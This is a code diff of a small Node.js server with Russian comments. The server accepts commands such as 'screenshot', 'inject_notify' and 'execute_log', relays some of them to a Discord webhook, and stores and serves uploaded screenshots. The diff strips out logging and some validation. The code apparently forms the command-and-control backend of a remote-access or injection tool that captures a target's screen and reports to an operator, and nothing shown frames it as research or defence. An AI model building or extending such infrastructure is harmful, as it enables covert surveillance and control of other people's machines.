@@ -10,9 +10,6 @@ const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Content-Type', 'application/json');
     
-    // Логирование запросов
-    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
-    
     if (req.method === 'POST' && req.url === '/command') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -20,12 +17,6 @@ const server = http.createServer((req, res) => {
             try {
                 const { command, args } = JSON.parse(body);
                 
-                if (command === "screenshot") {
-                    lastCommand = command;
-                    res.end(JSON.stringify({ status: "Screenshot requested" }));
-                    return;
-                }
-
                 // Логирование в Discord
                 if (command === "user_chat" || command === "inject_notify" || command === "execute_log") {
                     fetch(WEBHOOK_URL, {
@@ -41,7 +32,6 @@ const server = http.createServer((req, res) => {
                 lastArgs = args || [];
                 res.end(JSON.stringify({ status: "OK" }));
             } catch (e) {
-                console.error("Command error:", e);
                 res.statusCode = 400;
                 res.end(JSON.stringify({ error: "Invalid request" }));
             }
@@ -55,13 +45,9 @@ const server = http.createServer((req, res) => {
         req.on('end', () => {
             try {
                 const { image } = JSON.parse(body);
-                if (!image) throw new Error("No image data");
-                
                 lastScreenshot = image;
-                console.log("Screenshot received successfully");
                 res.end(JSON.stringify({ status: "Screenshot received" }));
             } catch (e) {
-                console.error("Screenshot upload error:", e);
                 res.statusCode = 400;
                 res.end(JSON.stringify({ error: "Invalid screenshot data" }));
             }
@@ -72,7 +58,6 @@ const server = http.createServer((req, res) => {
     if (req.method === 'GET' && req.url === '/screenshot') {
         if (lastScreenshot) {
             res.end(JSON.stringify({ image: lastScreenshot }));
-            lastScreenshot = null; // Очищаем после отправки
         } else {
             res.statusCode = 404;
             res.end(JSON.stringify({ error: "No screenshot available" }));
